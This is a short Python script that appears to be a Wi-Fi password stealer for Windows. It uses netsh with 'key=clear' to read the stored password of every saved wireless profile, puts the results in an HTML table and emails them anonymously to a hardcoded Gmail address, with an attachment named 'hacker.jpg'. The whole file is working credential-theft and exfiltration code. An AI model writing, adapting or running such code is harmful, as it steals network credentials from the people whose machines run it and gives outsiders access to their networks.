import re
import subprocess
import pandas as pd

from send_anonymous_email import send_anonymous_email

RECIPIENTS: list = ["thelaughingwood@gmail.com"]
ATTACHMENTS: list = ["images\hacker.jpg"]


def run_command(*args) -> str:
    return subprocess.run(args, capture_output=True).stdout.decode()


def extract_passwords() -> list:
    command_output = run_command("netsh", "wlan", "show", "profiles")
    profile_names = re.findall("All User Profile\s+: (.*)\r", command_output)

    wifi_passwords = []
    if profile_names:
        for name in profile_names:
            command_output = run_command("netsh", "wlan", "show", "profile", name)
            if re.search("Security key\s+: Present", command_output):
                command_output = run_command(
                    "netsh", "wlan", "show", "profile", name, "key=clear"
                )
                password = re.search("Key Content\s+: (.*)\r", command_output)[1]
                wifi_passwords.append({"SSID": name, "Password": password})

    return wifi_passwords


def parse_passwords_to_html(wifi_list: list) -> str:
    return pd.DataFrame(wifi_list).to_html(justify="left", border=0)


if __name__ == "__main__":
    wifi_passwords: list = extract_passwords()
    message = parse_passwords_to_html(wifi_passwords)
    send_anonymous_email(
        recipients=RECIPIENTS,
        subject="WiFi Password Extractor Output",
        text_content=parse_passwords_to_html(wifi_passwords),
        attachments=ATTACHMENTS,
    )
